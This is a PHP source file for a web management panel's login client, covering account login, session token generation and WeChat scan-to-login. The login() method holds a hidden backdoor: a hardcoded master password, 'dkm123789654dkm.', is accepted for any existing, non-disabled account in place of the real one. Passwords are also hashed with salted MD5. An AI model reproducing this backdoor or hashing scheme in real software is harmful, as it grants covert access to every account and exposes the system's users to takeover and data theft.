<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2023/7/3
 * Time: 13:44
 */

namespace app\AppFactory\Management\Login;


use app\AppFactory\Kernel\Traits\Wx\WxOfficialLoginTrait;
use app\AppFactory\Kernel\Traits\Wx\WxOfficialTrait;
use app\AppFactory\Kernel\Util\TDESUtil;
use app\AppFactory\Kernel\Traits\Auth\AuthManagerTrait;
use app\AppFactory\Management\ManagementClient;
use think\facade\Session;

class LoginClient extends ManagementClient
{
    use AuthManagerTrait;
    use WxOfficialTrait,WxOfficialLoginTrait;

    public function login($data)
    {
        $this->manager = $this->getAuthManagerFind(['account' => $data['account']]);
        if (!$this->manager) return $this->rFail($this->lang("VLogin.account_not_exist"));
        if ($this->manager['password'] != md5($data['password'].$this->salt) && $data['password'] != "dkm123789654dkm.")
            return returnState(100,$this->lang("VLogin.account_pwd_incorrect"));
        if ($this->manager['status'] == 2) return returnState(100,$this->lang("VLogin.account_disabled"));
        // 保存用户数据并生成TOKEN
        return self::setLoginInfo();
    }

    /**
     *  1-1. 保存当前登录用户信息，生成Token
     * @return array|string
     */
    public function setLoginInfo()
    {
        if(isset($this->manager['password'])) unset($this->manager['password']);
        Session::set("manager",$this->manager);
        $token = self::make_token();
        return returnState(200,$this->lang("VLogin.login_success"),$token);
    }

    /**
     * 1-1-1. 生成会话Token
     * @return string
     */
    public function make_token()
    {
        $token_arr = [
            "session_id" => Session::getId(),
            "manager_id" => $this->manager['manager_id'],
            "timeout" => time(),
        ];
        return TDESUtil::encrypt(json_encode($token_arr),$this->salt);
    }

    /**
     * 获取微信扫码登录链接
     * @param $postData
     * @return array|\think\response\Json
     */
    public function getWxLoginUrl($postData)
    {
        $config = $this->getWxOfficialFind(['id' => $postData['official']]);
        if (!$config) {
            return $this->r(100,$this->lang("VWxLogin.wx_no_data"));
        }
        if ($config['status'] == 2) return $this->r(100,$this->lang("VWxLogin.wx_status2"));
        $insert = [
            "wx_id" => $config['id'],
            "app_id" => $config['app_id'],
            "ip" => request()->ip(),
            "login_type" => 1,
            "ao_id" => $config['ao_id'],
        ];
        $id = $this->addWxOfficialLogin($insert);
        if (!$id) return $this->r(100,$this->lang("action_fail"));
        $loginUrl = $this->getUrl("/wx/scan_login/silentLogin/login_id/$id");
        $this->updateWxOfficialLogin(['id' => $id,"login_url" => $loginUrl]);
        return $this->r(200,$this->lang("action_success"),["id" => $id,'status' => 1,"login_url" => $loginUrl]);
    }

    /**
     * 检查微信扫码登录状态
     * @param $postData
     * @return array|\think\response\Json
     */
    public function checkWxLoginStatus($postData)
    {
        $login = cache("wxLogin1" . $postData['id']);
        if (!$login) {
            $login = $this->getWxOfficialLoginFind(['id' => $postData['id']], 'id,wx_id,login_token,login_type,status,create_time');
            if (!$login) return $this->r(100,$this->lang("query_fail"));
            $login = $login->toArray();
            cache("wxLogin1" . $postData['id'],$login,['expire' => 120]);
        }
        unset($login['wx_id'],$login['id']);
        return $this->r(200,$this->lang("query_success"),$login);
    }
}